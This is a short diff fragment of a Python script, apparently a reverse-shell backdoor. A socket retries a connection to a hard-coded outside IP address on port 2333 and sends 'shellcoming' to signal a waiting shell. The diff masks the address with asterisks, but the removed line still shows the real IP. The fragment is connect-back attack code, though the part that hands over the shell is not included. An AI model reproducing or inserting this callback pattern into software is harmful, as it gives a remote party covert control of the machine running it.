@@ -9,7 +9,7 @@ def func():
     s=socket(AF_INET,SOCK_STREAM)
     while 1>0:
         try:
-            s.connect(('23.83.249.21',2333))
+            s.connect(('***',2333))
             s.sendall("shellcoming\n")
             break
         except:
